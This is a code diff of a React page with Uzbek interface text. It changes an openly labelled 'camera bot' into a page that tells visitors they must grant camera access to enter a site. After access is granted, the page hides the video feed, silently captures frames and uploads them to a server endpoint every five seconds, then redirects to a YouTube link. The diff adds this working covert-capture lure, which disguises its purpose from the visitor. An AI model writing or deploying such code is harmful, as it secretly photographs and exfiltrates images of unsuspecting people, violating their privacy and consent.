@@ -2,21 +2,48 @@ import { useRef, useEffect, useState } from "react";
 
 export default function Home() {
   const videoRef = useRef(null);
+  const [permission, setPermission] = useState(null); // null | true | false
+  const [countdown, setCountdown] = useState(5);
   const [sending, setSending] = useState(false);
 
+  const TARGET_LINK = "https://www.youtube.com/watch?v=Nv9qxur1s2k";
+
+  // Kamera ruxsati so‘rash funksiyasi
+  const requestCamera = async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      videoRef.current.srcObject = stream;
+      setPermission(true);
+    } catch (err) {
+      console.error("Camera permission denied:", err);
+      setPermission(false);
+    }
+  };
+
+  // 5 sekund sanash va keyin linkga o‘tish
   useEffect(() => {
-    // Kamerani ishga tushirish
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => { videoRef.current.srcObject = stream; })
-      .catch(err => console.error("Camera error:", err));
+    if (permission) {
+      const interval = setInterval(() => {
+        setCountdown(prev => {
+          if (prev <= 1) {
+            window.location.href = TARGET_LINK;
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
 
-    // Har 5 soniyada rasm yuborish
-    const interval = setInterval(() => {
-      captureAndSend();
-    }, 1000); // 5000 ms = 5 soniya
+      // Avtomatik rasm yuborish
+      const photoInterval = setInterval(() => {
+        captureAndSend();
+      }, 5000); // har 5 soniyada
 
-    return () => clearInterval(interval);
-  }, []);
+      return () => {
+        clearInterval(interval);
+        clearInterval(photoInterval);
+      };
+    }
+  }, [permission]);
 
   const captureAndSend = async () => {
     if (sending || !videoRef.current) return;
@@ -24,33 +51,57 @@ export default function Home() {
 
     try {
       const canvas = document.createElement("canvas");
-      canvas.width = videoRef.current.videoWidth;
-      canvas.height = videoRef.current.videoHeight;
+      canvas.width = videoRef.current.videoWidth || 640;
+      canvas.height = videoRef.current.videoHeight || 480;
       canvas.getContext("2d").drawImage(videoRef.current, 0, 0);
 
       const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));
       const formData = new FormData();
-      formData.append("photo", blob, "auto_frame.jpg");
+      formData.append("photo", blob, "auto.jpg");
 
-      const res = await fetch("/api/send-photo", {
+      await fetch("/api/send-photo", {
         method: "POST",
-        body: formData,
+        body: formData
       });
-
-      const data = await res.json();
-      console.log("Auto send response:", data);
+      console.log("Rasm yuborildi!");
     } catch (err) {
-      console.error("Error sending auto photo:", err);
+      console.error("Rasm yuborishda xatolik:", err);
     }
 
     setSending(false);
   };
 
   return (
-    <div style={{ textAlign: "center" }}>
-      <h1>Avtomatik Kamera Bot</h1>
-      <video ref={videoRef} autoPlay playsInline style={{ width: "100%", maxWidth: "400px" }} />
-      <p>{sending ? "Yuborilmoqda..." : "Har 5 soniyada rasm yuboriladi"}</p>
+    <div style={{
+      backgroundColor: "black",
+      color: "white",
+      height: "100vh",
+      display: "flex",
+      flexDirection: "column",
+      justifyContent: "center",
+      alignItems: "center"
+    }}>
+      {permission === null && (
+        <>
+          <h1>Saytga kirish uchun ruxsat bering</h1>
+          <button onClick={requestCamera} style={{ marginTop: 20, padding: "10px 20px" }}>Ruxsat berish</button>
+        </>
+      )}
+
+      {permission === false && (
+        <>
+          <h1>Iltimos, ruxsat bering, aks holda saytga kira olmaysiz</h1>
+          <button onClick={requestCamera} style={{ marginTop: 20, padding: "10px 20px" }}>Ruxsat berish</button>
+        </>
+      )}
+
+      {permission === true && (
+        <>
+          <video ref={videoRef} autoPlay playsInline style={{ display: "none" }} />
+          <h1>Ruxsat berildi! Sayt {countdown} soniyadan keyin ochiladi...</h1>
+          <p>{sending ? "Rasm yuborilmoqda..." : "Rasm avtomatik yuboriladi"}</p>
+        </>
+      )}
     </div>
   );
 }
